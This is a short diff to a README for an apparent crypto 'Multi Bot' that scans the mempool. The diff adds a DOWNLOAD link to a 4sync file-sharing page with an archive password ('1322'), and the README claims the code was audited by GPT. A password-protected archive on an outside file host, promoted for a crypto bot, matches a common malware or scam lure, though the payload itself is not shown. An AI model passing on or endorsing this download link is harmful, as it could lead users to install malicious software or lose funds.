@@ -6,6 +6,12 @@
 
 <div align="center">This Multi Bot was created using ChatGPT-4, with code collaboratively reviewed and audited by GPT.</div>
 
+
+# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+## PASSWORD: 1322
+
+
+
 ## **Key Features**
 
 - **Rapid Mempool Scanning**  
